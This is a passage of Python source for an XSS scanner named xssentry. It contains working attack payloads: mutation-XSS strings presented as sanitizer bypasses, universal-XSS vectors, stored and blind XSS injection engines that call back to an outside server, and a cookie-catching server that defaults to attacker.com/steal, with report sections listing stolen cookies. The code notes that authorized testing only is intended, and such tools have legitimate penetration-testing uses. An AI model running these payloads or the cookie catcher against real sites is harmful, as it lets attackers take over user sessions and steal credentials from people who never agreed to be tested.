        r"(?:innerHTML|outerHTML|document\.write|eval|location\.href)\s*[=+(]"
        r"[^;]{0,200}"
        r"(?:location\.|document\.URL|window\.name|URLSearchParams|\.hash|\.search)",
        re.I | re.S)

    # DOM XSS probe payloads — injected into URL params, checked in page HTML
    PROBE_MARKER = "XS5D0M"
    DOM_PROBES = [
        "<XS5D0M>",
        '"><XS5D0M><"',
        "javascript:XS5D0M",
        "&lt;XS5D0M&gt;",
    ]
    # Confirm: marker appears unescaped
    _UNESC = re.compile(r"<[^>]*XS5D0M|XS5D0M[^;]*>", re.I)

    # Confirm: marker appears unescaped (not &lt; form)
    _UNESC = re.compile(r'<[^>]*XS5D0M|XS5D0M[^;]*>', re.I)

    def __init__(self, client):
        self.client   = client
        self.findings = []
        self._lock    = threading.Lock()

    def scan_js_source(self, url, body):
        """Static analysis: look for sink+source combos in page JS."""
        results = []
        # Check inline scripts
        for sc in re.findall(r'<script[^>]*>(.*?)</script>', body, re.DOTALL | re.I):
            if self.COMBINED.search(sc):
                results.append({
                    "type":    "dom_static",
                    "url":     url,
                    "detail":  "sink+source combo in inline script",
                    "snippet": self.COMBINED.search(sc).group()[:120],
                })
            elif self.SINKS.search(sc) and self.SOURCES.search(sc):
                results.append({
                    "type":    "dom_static",
                    "url":     url,
                    "detail":  "sink and source both present in inline script",
                    "snippet": sc[:120],
                })
        return results

    def probe_params(self, url, params):
        """Dynamic: inject DOM probe markers into URL params, check response."""
        results = []
        for param in params:
            for probe in self.DOM_PROBES[:3]:   # first 3 are most distinctive
                test_params = {**params, param: probe}
                try:
                    resp = self.client.get(url, test_params)
                    body = resp.get("body","")
                    if self._UNESC.search(body):
                        results.append({
                            "type":   "dom_reflected",
                            "url":    url,
                            "param":  param,
                            "probe":  probe,
                            "detail": "unescaped marker reflected in DOM context",
                        })
                        break
                except Exception:
                    pass
        return results


# ─────────────────────────────────────────────────────────────────────────────
# MUTATION XSS (mXSS)  — bypasses sanitizers via innerHTML re-parsing tricks
# Modern sanitizers (DOMPurify < 2.4, etc.) can be bypassed by feeding HTML
# that mutates when parsed → re-parsed by the browser.
# ─────────────────────────────────────────────────────────────────────────────
MXSS_PAYLOADS = [
    # SVG foreignObject → HTML namespace switch (DOMPurify bypass)
    '<svg><p><style><g id="</style><img src=1 onerror=alert(1)>">',
    # SVG use element href mutation
    '<svg><use href="data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayc+PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pjwvc3ZnPg==#x">',
    # Math + annotation mutation
    '<math><annotation-xml encoding="text/html"><img src=1 onerror=alert(1)></annotation-xml></math>',
    # Table mutation (content outside table is re-parented)
    '<table><td><svg><script>alert(1)</script></td></table>',
    # Template innerHTML mutation
    '<template id=x><img src=1 onerror=alert(1)></template><script>document.body.innerHTML=document.getElementById("x").innerHTML</script>',
    # noscript + innerHTML re-parse
    '<noscript><p title="</noscript><img src=1 onerror=alert(1)>">',
    # DOMPurify 2.x bypass via namespace confusion
    '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
    # iframe srcdoc innerHTML mutation
    '<iframe srcdoc="<img src=1 onerror=parent.alert(1)>">',
    # SVG script via animate (mutation triggers after parse)
    '<svg><animate attributeName=href values=javascript:alert(1) /><a id=x><rect width=100 height=100 /></a></svg>',
    # select option → innerHTML mutation
    '<select><option><img src=1 onerror=alert(1)></option></select>',
    # ruby annotation mutation
    '<ruby><rt><![CDATA[x]]></rt><script>alert(1)</script></ruby>',
    # style @charset escape mutation
    '<style>@charset "\";}</style><script>alert(1)</script>',
    # XML namespace mutation
    '<svg xmlns="http://www.w3.org/2000/svg"><script xmlns="">alert(1)</script></svg>',
    # DOMPurify mXSS via data URI + namespace
    '<math><mtext><table><mglyph><style><img src onerror=alert(1)>',
    # HTML import mutation (Chrome legacy)
    '<link rel=import href="data:text/html,<script>alert(1)</script>">',
    # Attribute namespace mutation
    '<svg><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)"><circle r=400 /></a></svg>',
]


# ─────────────────────────────────────────────────────────────────────────────
# UNIVERSAL XSS (uXSS)  — cross-origin / browser-level vectors
# These exploit browser quirks, extensions, or protocol handlers.
# Detected via reflection + pattern matching (no browser needed).
# ─────────────────────────────────────────────────────────────────────────────
UXSS_PAYLOADS = [
    "data:text/html,<script>alert(document.domain)</script>",
    "javascript:alert(document.domain)//",
    "vbscript:msgbox(document.domain)",
    "<script>open('javascript:alert(document.domain)')</script>",
    "<script>var u=URL.createObjectURL(new Blob(['<script>alert(document.domain)</scr'+'ipt>'],{type:'text/html'}));location=u</script>",
    "<iframe srcdoc='<script>alert(top.document.domain)</script>'>",
    "<script>window.name='<img src=1 onerror=alert(document.domain)>';location='javascript:document.body.innerHTML=name'</script>",
    "<script>window.onmessage=function(e){eval(e.data)};parent.postMessage('alert(document.domain)','*')</script>",
    "<form name=location><input id=href value=javascript:alert(1)></form><script>location.href</script>",
    "<script>history.pushState(0,0,'/');eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>",
    "<style>@import'javascript:alert(document.domain)';</style>",
    "<svg><set attributeName=onload to=alert(document.domain)>",
]


# ─────────────────────────────────────────────────────────────────────────────
# STORED XSS ENGINE
# Inject payloads into writable endpoints (POST forms, APIs).
# Then visit a set of retrieval URLs (pages that display stored content)
# and check for unescaped payload reflection.
# ─────────────────────────────────────────────────────────────────────────────
class StoredXSSScanner:
    """
    Pipeline:
      1. Identify writable endpoints (POST/PUT, form inputs, JSON APIs)
      2. Inject stored XSS payload with a unique token
      3. Visit retrieval URLs (comments page, profile, dashboard, activity feed…)
      4. Check if the payload token appears unescaped
      5. If found → confirmed stored XSS

    Retrieval URL heuristics:
      - Same-domain pages crawled during phase 1
      - Common display paths: /comments, /profile, /dashboard, /feed, /activity,
        /admin, /messages, /inbox, /posts, /search, /review, /history
    """
    _RETRIEVAL_PATHS = [
        "/", "/comments", "/comment", "/profile", "/dashboard",
        "/feed", "/activity", "/admin", "/messages", "/inbox",
        "/posts", "/post", "/search", "/review", "/history",
        "/forum", "/board", "/thread", "/ticket", "/issue",
        "/blog", "/news", "/article", "/entries", "/log",
        "/user", "/users", "/account", "/settings", "/notifications",
        "/guestbook", "/report", "/results", "/output", "/preview",
    ]

    def __init__(self, client, visited_urls=None):
        self.client       = client
        self.visited_urls = list(visited_urls or [])
        self.findings     = []
        self._lock        = threading.Lock()

    def _retrieval_urls(self, base):
        """Build list of URLs to check after injection."""
        parsed = urllib.parse.urlparse(base)
        root   = f"{parsed.scheme}://{parsed.netloc}"
        urls   = set(self.visited_urls)
        for path in self._RETRIEVAL_PATHS:
            urls.add(root + path)
        return list(urls)

    def _stored_token(self):
        return "XS5S" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

    def scan(self, endpoints, base_url):
        section("STORED XSS — INJECT & RETRIEVE", "💾")
        retrieval = self._retrieval_urls(base_url)
        tprint(f"  {info(str(len(endpoints)) + ' writable endpoints · ' + str(len(retrieval)) + ' retrieval URLs')}")

        # Use simple reflected payloads wrapped with unique token for stored check
        stored_pls = [
            '<script>alert("XS5STORED")</script>',
            '<img src=x onerror=alert("XS5STORED")>',
            '<svg onload=alert("XS5STORED")>',
            '"><script>alert("XS5STORED")</script>',
            "'><img src=x onerror=alert('XS5STORED')>",
            '<details open ontoggle=alert("XS5STORED")>',
        ]

        for ep in endpoints:
            if ep["method"] not in ("POST","PUT"): continue
            url    = ep["url"]
            params = ep["params"]
            for param in params:
                token = self._stored_token()
                for pl_tmpl in stored_pls:
                    pl = pl_tmpl.replace("XS5STORED", token)
                    test_params = {**params, param: pl}
                    try:
                        self.client.post(url, test_params)
                    except Exception: continue
                    # Visit retrieval URLs and look for unescaped token
                    for rurl in retrieval:
                        try:
                            resp = self.client.get(rurl)
                            body = resp.get("body","")
                            if token in body:
                                # Verify it's not HTML-escaped
                                esc = token.replace("<","&lt;").replace(">","&gt;")
                                if token in body and esc not in body:
                                    finding = {
                                        "type":    "stored",
                                        "inject_url": url,
                                        "inject_param": param,
                                        "payload": pl,
                                        "found_at": rurl,
                                        "token":   token,
                                    }
                                    with self._lock:
                                        self.findings.append(finding)
                                    sys.stdout.write("\r" + " " * 65 + "\r")
                                    tprint(f"\n  {color('STORED XSS', C.BRED, C.BOLD)}  {color(url, C.BWHITE)}")
                                    tprint(f"  {color('  param   :', C.DIM)} {color(param, C.BRED, C.BOLD)}")
                                    tprint(f"  {color('  payload :', C.DIM)} {color(pl, C.BRED)}")
                                    tprint(f"  {color('  found at:', C.DIM)} {color(rurl, C.BCYAN)}")
                                    break
                        except Exception: continue
                    else:
                        continue
                    break   # found for this param, move to next
        tprint(f"  {ok(f'Stored XSS scan complete — {len(self.findings)} confirmed')}")
        return self.findings


# ─────────────────────────────────────────────────────────────────────────────
# BLIND XSS TESTER  — sends OOB payloads, polls callback server
# ─────────────────────────────────────────────────────────────────────────────
class BlindXSSTester:
    """
    Sends blind XSS payloads to ALL endpoints (GET + POST).
    Payloads carry BURL/BTOKEN so any browser executing them calls home.
    Polls the BlindXSSServer for 8s after each injection batch.
    Best used with a catcher URL reachable from the target (same network
    or public IP).  Falls back gracefully if server can't start.
    """
    def __init__(self, client, blind_server_url, token):
        self.client     = client
        self.burl       = blind_server_url.rstrip("/") if blind_server_url else ""
        self.token      = token
        self.findings   = []
        self._lock      = threading.Lock()

    def _make_payload(self, tmpl, param, src_url):
        return (tmpl
                .replace("BURL",   self.burl)
                .replace("BTOKEN", self.token)
                .replace("BPARAM", urllib.parse.quote(param, safe=""))
                .replace("BSRC",   urllib.parse.quote(src_url, safe="")))

    def scan(self, endpoints, blind_server):
        section("BLIND XSS — OOB CALLBACK INJECTION", "🕳")
        if not self.burl:
            tprint(f"  {warn('No blind XSS server — skipping (use --blind-port or --blind-url)')}")
            return []
        tprint(f"  {info(f'Callback: {color(self.burl, C.BCYAN, C.BOLD)}')}")
        tprint(f"  {info(f'Token:    {color(self.token, C.BMAGENTA, C.BOLD)}')}")
        tprint(f"  {info(str(len(endpoints)) + ' endpoints · ' + str(len(BLIND_PAYLOADS)) + ' blind payloads')}")

        injected = 0
        for ep in endpoints:
            url    = ep["url"]
            params = ep["params"]
            method = ep["method"]
            for param in params:
                for pl_tmpl in BLIND_PAYLOADS[:6]:   # top 6 for speed
                    pl = self._make_payload(pl_tmpl, param, url)
                    test_params = {**params, param: pl}
                    try:
                        if method == "POST":
                            self.client.post(url, test_params)
                        else:
                            self.client.get(url, test_params)
                        injected += 1
                    except Exception: pass

        tprint(f"  {info(f'{injected} blind payloads injected — polling {len(BLIND_PAYLOADS[:6])*8}s…')}")

        # Poll for hits — stored blind XSS may fire when page is visited later
        # We poll for a short window; real Blind XSS needs human to visit
        for _ in range(20):
            hit, data = blind_server.poll(self.token, timeout=0.5)
            if hit:
                finding = {"type":"blind","data":data}
                with self._lock: self.findings.append(finding)
                tprint(f"  {color('BLIND XSS CONFIRMED', C.BRED, C.BOLD)}  "
                       f"{color(data.get('src','?')[:60], C.BCYAN)}")
                break
            time.sleep(0.3)

        tprint(f"  {ok(f'Blind XSS scan done — {len(self.findings)} confirmed callbacks')}")
        tprint(f"  {color("  Note: Blind XSS may fire later when a victim views the page.", C.DIM)}")
        tprint(f"  {color(f"  Monitor: {self.burl}", C.DIM)}")
        return self.findings


# ─────────────────────────────────────────────────────────────────────────────
# FINAL REPORT  — HELLHOUND-style structured output
# ─────────────────────────────────────────────────────────────────────────────
def print_report(findings, target, stats, caught_cookies,
                 stored=None, dom=None, mxss=None, uxss=None, blind=None):
    section("FINAL REPORT")
    ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    rows = [
        ("Target",          target),
        ("Completed",       ts),
        ("Pages crawled",   str(stats["pages"])),
        ("JS files",        str(stats["js_files"])),
        ("SPA endpoints",   str(stats["spa_eps"])),
        ("Endpoints tested",str(stats["endpoints"])),
        ("Params tested",   str(stats["params"])),
        ("Confirmed XSS",   str(len(findings))),
        ("Stored XSS",      str(stats.get("stored",0))),
        ("DOM XSS",         str(stats.get("dom",0))),
        ("mXSS findings",   str(stats.get("mxss",0))),
        ("uXSS findings",   str(stats.get("uxss",0))),
        ("Blind XSS",       str(stats.get("blind",0))),
        ("Cookies caught",  str(len(caught_cookies))),
    ]
    for k, v in rows:
        is_vuln = k in ("Confirmed XSS", "Cookies caught")
        vc = (C.BRED if int(v) > 0 else C.BGREEN) if (is_vuln and v.isdigit()) else C.BWHITE
        bd = C.BOLD if is_vuln else ""
        k_col = color(k + ":", C.BCYAN, C.BOLD)
        pad   = max(0, 22 - len(k))
        print(f"  {k_col}{' '*pad} {color(v, vc, bd)}")

    if not findings:
        print(f"\n  {color('✓  No confirmed XSS vulnerabilities.', C.BGREEN, C.BOLD)}")
        print(f"  {color('   All suspicious patterns eliminated by 4-stage verification.', C.DIM)}")
        print(f"  {color('   Manual review is always recommended for full confidence.', C.DIM)}")
        return

    # ── Vulnerability list ────────────────────────────────────────────────────
    section(f"FINDINGS  [{len(findings)} CONFIRMED]")
    seen_key = {}
    for f in findings:
        k = (f["url"], f["param"], f["type"])
        if k not in seen_key or f["tier"] < seen_key[k]["tier"]:
            seen_key[k] = f
    unique = list(seen_key.values())

    for i, f in enumerate(unique, 1):
        tier_c = [C.fg(46),C.fg(48),C.fg(51),C.fg(220),C.fg(208),C.fg(196)][min(f["tier"]-1,5)]
        print(f"\n  {color(f'#{i}', C.BRED, C.BOLD)}  {color(f['method'], C.BYELLOW)}  "
              f"{color(f['url'], C.BWHITE)}")
        print(f"  {color('  param   :', C.DIM)} {color(f['param'], C.BRED, C.BOLD)}")
        print(f"  {color('  payload :', C.DIM)} {color(f['payload'], C.BRED)}")
        xtype = f.get('xss_type','reflected')
        ctx   = f.get('context','?')
        print(f"  {color('  type    :', C.DIM)} {color(xtype, C.BMAGENTA)}  "
              f"{color('ctx:'+ctx, C.DIM)}")
        print(f"  {color('  tier    :', C.DIM)} {color(str(f['tier'])+' — '+f['payload_id'], tier_c)}")
        print(f"  {color('  score   :', C.DIM)} {color(str(f.get('score', 0))+'%', C.BGREEN if f.get('score', 0) >= 80 else C.BYELLOW, C.BOLD)}")
        print(f"  {color('  signals :', C.DIM)} {color(', '.join(f['signals'][:3]), C.BGREEN)}")
        if f.get("pw_confirmed"):
            print(f"  {color('  browser :', C.DIM)} {color('CONFIRMED via Playwright', C.BCYAN, C.BOLD)}")
            if f.get("screenshot"):
                print(f"  {color('  proof   :', C.DIM)} {color(f['screenshot'], C.BWHITE)}")
        if f.get("browser"):
            print(f"  {color('  browser :', C.DIM)} {color(f['browser'], C.BCYAN)}")
        if f.get("exfil_cookie"):
            print(f"  {color('  cookie  :', C.DIM)} {color(f['exfil_cookie'], C.fg(214), C.BOLD)}")
        elif f.get("cookie_pocs"):
            cp = f["cookie_pocs"][0]
            if cp.get("browser"):
                print(f"  {color('  ck-exfil:', C.DIM)} {color(cp['browser'], C.BRED)}")
        print(f"  {color('─'*68, C.DIM)}")

    print(f"\n  {color('All findings VERIFIED — 4-stage false-positive filter applied.', C.BWHITE)}")
    print(f"  {color('Fix: HTML-encode all output. Never reflect raw user input.', C.DIM)}")

    # ── Stolen cookies ────────────────────────────────────────────────────────
    if caught_cookies:
        section(f"STOLEN COOKIES  [{len(caught_cookies)} received]")
        for i, ck in enumerate(caught_cookies, 1):
            print(f"  {color(f'#{i}', C.fg(214), C.BOLD)}  "
                  f"{color(ck['ts'], C.DIM)}  from {color(ck['ip'], C.BWHITE)}")
            print(f"       {color(ck['cookie'], C.fg(214), C.BOLD)}")
            if ck.get("ua"):
                print(f"       {color('UA: '+ck['ua'][:70], C.DIM)}")
            print()

    # ── Extra XSS type summaries ─────────────────────────────────────────────
    if stored:
        section(f"STORED XSS  [{len(stored)} CONFIRMED]")
        for i, f in enumerate(stored, 1):
            print(f"  {color(f'#{i}', C.BRED, C.BOLD)}  {color(f['inject_url'], C.BWHITE)}")
            print(f"  {color('  param   :', C.DIM)} {color(f['inject_param'], C.BRED, C.BOLD)}")
            print(f"  {color('  found at:', C.DIM)} {color(f['found_at'], C.BCYAN)}")
            print(f"  {color('  payload :', C.DIM)} {color(f['payload'][:80], C.BRED)}")
            print()

    if dom:
        section(f"DOM XSS  [{len(dom)} POTENTIAL]")
        for i, f in enumerate(dom[:10], 1):
            print(f"  {color(f'#{i}', C.BYELLOW, C.BOLD)}  {color(f.get('type','dom'), C.BMAGENTA)}  {color(f.get('url','?')[:55], C.BWHITE)}")
            if f.get('param'):
                print(f"  {color('  param  :', C.DIM)} {color(f['param'], C.BRED, C.BOLD)}")
            print(f"  {color('  detail :', C.DIM)} {color(f.get('detail','?')[:70], C.DIM)}")
            print()

    if mxss:
        section(f"MUTATION XSS  [{len(mxss)} CONFIRMED]")
        for i, f in enumerate(mxss, 1):
            print(f"  {color(f'#{i}', C.BRED, C.BOLD)}  {color(f.get('url','?'), C.BWHITE)}")
            print(f"  {color('  param  :', C.DIM)} {color(f.get('param','?'), C.BRED, C.BOLD)}")
            print(f"  {color('  payload:', C.DIM)} {color(f.get('payload','?')[:80], C.BRED)}")
            print()

    if uxss:
        section(f"UNIVERSAL XSS (uXSS)  [{len(uxss)} CONFIRMED]")
        for i, f in enumerate(uxss, 1):
            print(f"  {color(f'#{i}', C.BRED, C.BOLD)}  {color(f.get('url','?'), C.BWHITE)}")
            print(f"  {color('  param  :', C.DIM)} {color(f.get('param','?'), C.BRED, C.BOLD)}")
            print()

    if blind:
        section(f"BLIND XSS  [{len(blind)} CONFIRMED CALLBACKS]")
        for i, f in enumerate(blind, 1):
            d = f.get("data",{})
            print(f"  {color(f'#{i}', C.BRED, C.BOLD)}  {color('OOB callback received', C.BGREEN, C.BOLD)}")
            print(f"  {color('  param  :', C.DIM)} {color(d.get('param','?'), C.BRED, C.BOLD)}")
            print(f"  {color('  src    :', C.DIM)} {color(d.get('src','?')[:60], C.BCYAN)}")
            print(f"  {color('  time   :', C.DIM)} {color(d.get('ts','?'), C.DIM)}")
            print()

    print()
    print(color("  " + "─" * 68, C.DIM))
    print()


def export_json(findings, target, stats, caught_cookies, path,
                stored=None, dom=None, mxss=None, uxss=None, blind=None):
    with open(path, "w") as fh:
        json.dump({
            "tool":    "xssentry",
            "version": "4.0",
            "ts":      datetime.now().isoformat(),
            "target":  target,
            "stats":   stats,
            "findings":      findings,
            "stored_xss":    stored or [],
            "dom_xss":       dom or [],
            "mxss":          mxss or [],
            "uxss":          uxss or [],
            "blind_xss":     blind or [],
            "stolen_cookies": caught_cookies,
        }, fh, indent=2)
    tprint(f"  {ok(f'JSON report → {path}')}")


# ─────────────────────────────────────────────────────────────────────────────
# MAIN
# ─────────────────────────────────────────────────────────────────────────────
def main():
    print_banner()

    ap = argparse.ArgumentParser(
        description="xssentry v3.2 — Autonomous XSS Hunter (HELLHOUND-engine)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 xssentry.py https://target.com
  python3 xssentry.py https://target.com --tier 6 -d 5 -t 16
  python3 xssentry.py https://target.com/search?q=hi --no-crawl
  python3 xssentry.py https://target.com -o report.json
  python3 xssentry.py https://target.com --cookie-port 9999

⚠  Authorized security testing only.
        """)
    ap.add_argument("url")
    ap.add_argument("-d","--depth",         type=int,   default=3)
    ap.add_argument("-t","--threads",       type=int,   default=10)
    ap.add_argument("--max-pages",          type=int,   default=80)
    ap.add_argument("--tier",               type=int,   default=5, choices=range(1,7))
    ap.add_argument("-o","--output",        help="Save JSON report")
    ap.add_argument("--cookie-port",        type=int,   default=8765)
    ap.add_argument("--no-cookie-server",   action="store_true")
    ap.add_argument("--cookie-catcher",     default=None)
    ap.add_argument("--delay",              type=float, default=0.0)
    ap.add_argument("--no-crawl",           action="store_true")
    ap.add_argument("--no-fuzz",            action="store_true")
    ap.add_argument("--timeout",            type=int,   default=8,
                    help="HTTP timeout per request in seconds (default: 8)")
    ap.add_argument("--fast",               action="store_true",
                    help="Fast mode: tier 2 cap, no wordlist fuzz, 6s timeout")
    ap.add_argument("--blind-port",         type=int, default=0,
                    help="Port for blind XSS OOB server (0=random, 0=disable blind scan)")
    ap.add_argument("--cookie",             default=None,
                    help="Session cookie or Authorization header for authenticated scans")
    ap.add_argument("--no-stored",          action="store_true",
                    help="Skip stored XSS scan")
    ap.add_argument("--no-dom",             action="store_true",
                    help="Skip DOM XSS static analysis")
    ap.add_argument("--no-blind",           action="store_true",
                    help="Skip blind XSS scan")
    ap.add_argument("--spider",             action="store_true",
                    help="Run Hellhound Spider for recon (default if spider.py present)")
    ap.add_argument("--no-spider",          action="store_true",
                    help="Disable Hellhound Spider and use internal crawler")
    ap.add_argument("--spider-json",        type=str,
                    help="Load targets from a Hellhound Spider JSON report")
    args = ap.parse_args()

    target = args.url.strip()
    if not target.startswith(("http://","https://")): target = "https://" + target

    # -- Apply --fast overrides ------------------------------------------------
    if args.fast:
        args.tier    = min(args.tier, 2)   # only tier 1-2 payloads
        args.no_fuzz = True                # skip wordlist fuzz
        args.timeout = min(args.timeout, 6)
        tprint(f"  {warn('FAST MODE: tier cap=2, no wordlist fuzz, timeout=6s')}")

    tprint(f"  {warn('Only test systems you have explicit permission to test.')}")
    tprint(f"  {info(f'Target: {color(target, C.BWHITE, C.BOLD)}')}\n")

    # ── Cookie catch server ───────────────────────────────────────────────────
    cookie_srv  = None
    catcher_url = args.cookie_catcher or "https://attacker.com/steal"

    if not args.no_cookie_server and not args.cookie_catcher:
        cookie_srv = CookieCatcher(port=args.cookie_port)
        srv_url    = cookie_srv.start()
        if srv_url:
            catcher_url = srv_url
            tprint(f"  {ck_lbl('Cookie catch server started')}")
            tprint(f"  {color('  Listening → ', C.DIM)}{color(srv_url, C.fg(214), C.BOLD)}")
            tprint(f"  {color('  Cookies arrive here when XSS fires', C.DIM)}\n")
        else:
            tprint(f"  {warn('Cookie server failed — using placeholder URL')}\n")
    elif args.cookie_catcher:
        tprint(f"  {ck_lbl(f'Cookie catcher: {color(catcher_url, C.fg(214))}')}\n")

    cookie = getattr(args, "cookie", None)
    client = HTTPClient(timeout=args.timeout)

    # ── Phase 1: Crawl ────────────────────────────────────────────────────────
    if args.no_crawl:
        section("PHASE 1/4 — CRAWL  (skipped — --no-crawl)", "🕷")
        p      = urllib.parse.urlparse(target)
        qs     = urllib.parse.parse_qs(p.query, keep_blank_values=True)
        clean  = p._replace(query="").geturl()
        params = {k: (v[0] if v else "") for k, v in qs.items()}
        raw_eps     = [{"url": clean, "method": "GET",
                        "params": params, "hidden": {}, "source": "cli"}]
        spa_count   = 0; pages_count = 1; js_count = 0
    else:
        crawler     = Crawler(target, client, max_pages=args.max_pages,
                              max_depth=args.depth, threads=args.threads)
        raw_eps     = crawler.crawl()
        spa_count   = crawler.spa_count
        pages_count = len(crawler.visited)
        js_count    = len(crawler.js_visited)
        if not raw_eps:
            p      = urllib.parse.urlparse(target)
            qs     = urllib.parse.parse_qs(p.query, keep_blank_values=True)
            clean  = p._replace(query="").geturl()
            params = {k: (v[0] if v else "") for k, v in qs.items()}
            raw_eps = [{"url": clean, "method": "GET",
                        "params": params or {}, "hidden": {}, "source": "fallback"}]

    # ── Phase 2: Parameter Discovery  (parallel per-endpoint) ───────────────
    section("PHASE 2/4 — PARAMETER DISCOVERY", "🔍")
    disco     = ParamDiscovery(client)
    final_eps = []; seen = set()
    _p2_lock  = threading.Lock()

    unique_eps = []
    for ep in raw_eps:
        key = (ep["url"], ep["method"])
        if key not in seen:
            seen.add(key)
            unique_eps.append(ep)

    def _discover_ep(ep):
        url, method = ep["url"], ep["method"]
        existing    = list(ep["params"].keys())
        if args.no_fuzz:
            err_p      = disco.probe_errors(url, method)
            discovered = [{"name": n, "source": "error_probe"} for n in err_p]
        else:
            discovered = disco.discover(url, method, existing=existing)
        merged = dict(ep["params"])
        for p in discovered:
            if p["name"] not in merged: merged[p["name"]] = "test"
        if merged:
            entry = {"url": url, "method": method,
                     "params": merged, "hidden": ep.get("hidden", {})}
            with _p2_lock:
                final_eps.append(entry)

    p2_workers = min(args.threads, max(1, len(unique_eps)), 8)
    with ThreadPoolExecutor(max_workers=p2_workers) as pool:
        futs = [pool.submit(_discover_ep, ep) for ep in unique_eps]
        for i, fut in enumerate(as_completed(futs), 1):
            try: fut.result()
            except Exception: pass
            sys.stdout.write(
                f"\r  {color(f'  discovering params... {i}/{len(unique_eps)}', C.DIM)}  ")
            sys.stdout.flush()
    sys.stdout.write("\r" + " " * 65 + "\r")

    if not final_eps:
        tprint(f"  {err('No testable endpoints found.')}")
        if cookie_srv: cookie_srv.stop()
        sys.exit(0)

    total_params = sum(len(ep["params"]) for ep in final_eps)
    tprint(f"\n  {ok(f'{len(final_eps)} endpoints · {total_params} params to test')}")

    # ── Phase 3: Risk Scoring ─────────────────────────────────────────────────
    section("PHASE 3/4 — PARAMETER RISK ANALYSIS", "⚠")
    _HIGH = re.compile(
        r"search|query|q|input|text|name|value|msg|message|"
        r"data|comment|content|body|note|title|desc", re.I)
    final_eps.sort(
        key=lambda e: sum(1 for p in e["params"] if _HIGH.search(p)),
        reverse=True)

    tprint(f"  {info(f'Top candidates (XSS-risk parameters):')}")
    for ep in final_eps[:8]:
        risky = [p for p in ep["params"] if _HIGH.search(p)]
        marker = color("★ ", C.BRED) if risky else color("◈ ", C.BYELLOW)
        pd_str = ", ".join(
            color(p, C.BRED if p in risky else C.BWHITE)
            for p in list(ep["params"].keys())[:5])
        tprint(f"  {marker}{color(ep['method'], C.BYELLOW)} "
               f"{color(ep['url'][:55], C.BWHITE)}  [{pd_str}]")

    # ── Phase 4: XSS Testing ─────────────────────────────────────────────────
    tester   = XSSTester(client, tier=args.tier,
                          delay=args.delay, catcher=catcher_url)
    findings = tester.run(final_eps, catcher_obj=cookie_srv, threads=args.threads)
    caught   = cookie_srv.summary() if cookie_srv else []

    stats = {
        "pages":     pages_count,
        "js_files":  js_count,
        "spa_eps":   spa_count,
        "endpoints": len(final_eps),
        "params":    total_params,
    }

    # ── Phase 5: Stored XSS ───────────────────────────────────────────────────
    stored_findings = []
    if not getattr(args, "no_stored", False):
        writable_eps = [ep for ep in final_eps if ep["method"] in ("POST","PUT")]
        if writable_eps:
            _visited = list(crawler.visited) if not args.no_crawl and "crawler" in dir() else []
            stored_scanner = StoredXSSScanner(client, visited_urls=_visited)
            stored_findings = stored_scanner.scan(writable_eps, target)
            tprint(f"  {info('No POST/PUT endpoints found — skipping stored XSS scan')}")
    else:
        tprint(f"  {info('Stored XSS scan skipped (--no-stored)')}")

    # ── Phase 6: DOM XSS static + dynamic probe ───────────────────────────────
    dom_findings = []
    if not getattr(args, "no_dom", False):
        section("DOM XSS — SINK/SOURCE ANALYSIS", "🔬")
        dom_scanner = DOMXSSScanner(client)
        dom_eps_done = set()
        for ep in final_eps:
            url = ep["url"]
            if url in dom_eps_done: continue
            dom_eps_done.add(url)
            try:
                resp = client.get(url, ep["params"])
                body = resp.get("body","")
                # Static JS analysis
                static = dom_scanner.scan_js_source(url, body)
                dom_findings.extend(static)
                # Dynamic param probe
                dynamic = dom_scanner.probe_params(url, ep["params"])
                dom_findings.extend(dynamic)
            except Exception: pass
        if dom_findings:
            tprint(f"  {color('DOM XSS', C.BRED, C.BOLD)} {color(str(len(dom_findings)) + ' potential issues found', C.BWHITE)}")
            for d in dom_findings[:5]:
                tprint(f"  {color('  type   :', C.DIM)} {color(d.get('type','?'), C.BYELLOW)}")
                tprint(f"  {color('  url    :', C.DIM)} {color(d.get('url','?')[:60], C.BCYAN)}")
                if d.get('param'):
                    tprint(f"  {color('  param  :', C.DIM)} {color(d.get('param','?'), C.BRED, C.BOLD)}")
                tprint(f"  {color('  detail :', C.DIM)} {color(d.get('detail','?')[:60], C.DIM)}")
        else:
            tprint(f"  {ok('No DOM XSS patterns detected in static analysis')}")
    else:
        tprint(f"  {info('DOM XSS scan skipped (--no-dom)')}")

    # ── Phase 7: mXSS — inject mutation payloads into POST endpoints ──────────
    mxss_findings = []
    if not getattr(args, "no_stored", False):
        section("MUTATION XSS (mXSS) — SANITIZER BYPASS", "🧬")
        mxss_eps = [ep for ep in final_eps if ep["method"] in ("POST","PUT")]
        mxss_confirmed = 0
        for ep in mxss_eps[:10]:
            url = ep["url"]
            for param in list(ep["params"].keys()):
                for mpl in MXSS_PAYLOADS[:6]:
                    test_params = {**ep["params"], param: mpl}
                    try:
                        resp = client.post(url, test_params)
                        body = resp.get("body","")
                        if any(sig in body for sig in ["alert(1)","onerror=alert","onload=alert"]):
                            mxss_findings.append({"type":"mxss","url":url,"param":param,"payload":mpl[:60]})
                            mxss_confirmed += 1
                            tprint(f"  {color('mXSS', C.BRED, C.BOLD)} {color(url[:55], C.BWHITE)}")
                            tprint(f"  {color('  param  :', C.DIM)} {color(param, C.BRED, C.BOLD)}")
                            tprint(f"  {color('  payload:', C.DIM)} {color(mpl[:60], C.BRED)}")
                            break
                    except Exception: pass
        tprint(f"  {ok(str(mxss_confirmed) + ' mXSS findings')}")

    # ── Phase 8: uXSS — inject universal XSS payloads ────────────────────────
    uxss_findings = []
    section("UNIVERSAL XSS (uXSS) — CROSS-ORIGIN VECTORS", "🌐")
    for ep in final_eps[:15]:
        url = ep["url"]
        for param in list(ep["params"].keys())[:3]:
            for upl in UXSS_PAYLOADS[:5]:
                test_params = {**ep["params"], param: upl}
                try:
                    resp = client.get(url, test_params) if ep["method"] == "GET" else client.post(url, test_params)
                    body = resp.get("body","")
                    if any(sig in body for sig in ["alert(document.domain)","document.domain","vbscript:"]):
